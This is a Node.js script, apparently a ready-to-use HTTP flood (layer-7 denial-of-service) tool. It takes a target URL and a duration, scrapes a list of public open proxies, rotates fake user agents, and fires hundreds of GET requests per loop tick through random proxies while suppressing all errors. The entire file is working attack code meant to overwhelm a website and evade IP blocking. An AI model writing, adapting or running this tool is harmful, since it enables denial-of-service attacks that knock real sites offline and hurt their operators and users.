// 

if (process.argv.length <= 2) {
	console.log("Usage: node HTTP-BETA.js [https://ipchicken.com/(HTTP(s) Only!)] [TIME]");
	process.exit(-1);
}
var url = require('url');
var fs = require('fs');
var https = require('requestify');
var request = require('request');
var zlib = require('zlib');
var HttpsProxyAgent = require('https-proxy-agent');


request.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=9000&country=all&anonymity=all&ssl=all', (err, res, set) => {
  var proxies = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

  process.on('uncaughtException', (err) => {});
  process.on('unhandledRejection', (err) => {});
 
	const userAgents = [
	"nook browser/1.0",
	"Offline Explorer/2.5",
	"P3P Validator",
	"Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
	"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
	"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
	"portalmmm/2.0 N410i(c20;TB) ",
	"Python-urllib/2.5",
	"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
	"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
	"SearchExpress",
	"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
	"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
	"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
	"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonT100/R101",
	"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
	"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonT68/R201A",
	"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
	"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
	"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0"
	];

 
  var options = {};
  var parsed = url.parse(process.argv[2]);
  parsed.headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US;q=0.8,en;q=0.8',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'upgrade-insecure-requests': 1,
    'Connection': 'keep-alive',
    'upgrade-insecure-requests':1,
    'user-agent': '' + userAgents[Math.floor(Math.random() * userAgents.length)] + ''
  }

  setTimeout(function() {
    process.exit(1);
  }, process.argv[3] * 1000);

  setInterval(function() {
	 
	 for (var i = 0; i < 600; i++) {
    var options = parsed;
	 
    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
    options.agent = new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]);
	
    https.get(options, function(res) {
    });
	 
    }
  });
});
